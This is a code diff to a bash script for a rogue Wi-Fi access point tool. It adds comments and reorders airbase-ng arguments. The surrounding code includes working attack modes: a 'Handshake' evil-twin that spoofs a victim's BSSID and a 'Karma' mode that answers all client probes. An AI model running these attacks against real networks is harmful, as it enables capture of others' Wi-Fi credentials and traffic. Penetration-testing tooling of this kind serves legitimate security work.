@@ -52,7 +52,7 @@ depends()
     get_name "CHAN="; CHAN=$USE
     get_name "BEACON="; BEACON=$USE
     get_name "PPS="; PPS=$USE
-    get_name "AP="; UAP=$USE
+    get_name "AP="; UAP=$USE #This is what we name the AP via the config file
     get_name "BRIDGED="; BRIDGED=$USE
     get_name "BRIDGE_NAME="; BRIDGE_NAME=$USE
     get_name "ATTACK="; ATTACK=$USE
@@ -61,7 +61,7 @@ depends()
     get_name "ENCRYPTION="; ENCRYPTION=$USE
     get_name "MONITOR_MODE="; MONITOR_MODE=$USE
     IPT="/sbin/iptables"
-    AP="at0"
+    AP="at0" #This is the device name as per "ip addr"
     MON="${IFACE1}mon"
     VPN="tun0"
     VPNI="tap+"
@@ -159,11 +159,11 @@ trap killemAll INT HUP;
 startairbase()
 {
     [[ -z $(ip addr | grep -i "$MON") ]] && airmon-zc start $IFACE1 || echo "faild airmon"
-
+      # Add variable null checking so process doesn't crash without a report
     if [[ $MENUCHOICE == 1 ]]; then
         echo -n "$INFO STARTING SERVICE: AIRBASE-NG"
         if [[ $ATTACK == "Handshake" ]]; then
-            airbase-ng -$TYPE $ENCRYPTION -c $CHAN -a $VICTIM_BSSID -e $ESSID -v $MON > ${sessionfolder}/logs/airbase-ng.log &
+            airbase-ng -c $CHAN -a $VICTIM_BSSID -e $ESSID -$TYPE $ENCRYPTION -v $MON > ${sessionfolder}/logs/airbase-ng.log &
         elif [[ $ATTACK == "Karma" ]]; then
             airbase-ng -c $CHAN -x $PPS -I $BEACON -a $BSSID -e $ESSID -P -C 15 -v $MON > ${sessionfolder}/logs/airbase-ng.log &
         else # This just gives us an AP for Sniffing
